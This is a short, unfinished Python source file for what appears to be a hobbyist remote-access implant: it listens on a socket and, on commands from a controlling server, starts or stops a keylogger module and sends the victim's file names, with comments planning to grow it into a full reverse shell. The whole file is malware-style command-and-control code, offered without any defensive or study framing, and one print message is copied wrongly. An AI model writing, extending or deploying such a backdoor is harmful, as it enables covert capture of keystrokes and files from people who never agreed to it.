import socket
import userscanner
import keylogger
import time
# TODO finish a client command structure
""" 
    This will await commands from the server something like a reverse shell
    When the server sends a show file request this will call the userscanner function
    We can extend this to full on reverse shell in the future
"""
while True:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as main_s:
            print("0")
            main_s.bind(("192.168.0.103", 12345))
            print("1")
            main_s.listen(1)
            print("2")
            conn, addr = main_s.accept()
            print("3")
            with conn:
                while True:
                    time.sleep(0.1)
                    data = conn.recv(128).decode("utf-8") 
                    # The command section:
                    match data:
                        case "run -keylogger":
                            keylogger.start_keylogger(True)
                            print("Client Started the keylogger.")
                        case "stop -keylogger":
                            keylogger.start_keylogger(False)
                            print("Client Started the keylogger.")
                        case "run -getFileNames":
                            userscanner.sendFiles()
                        
                        
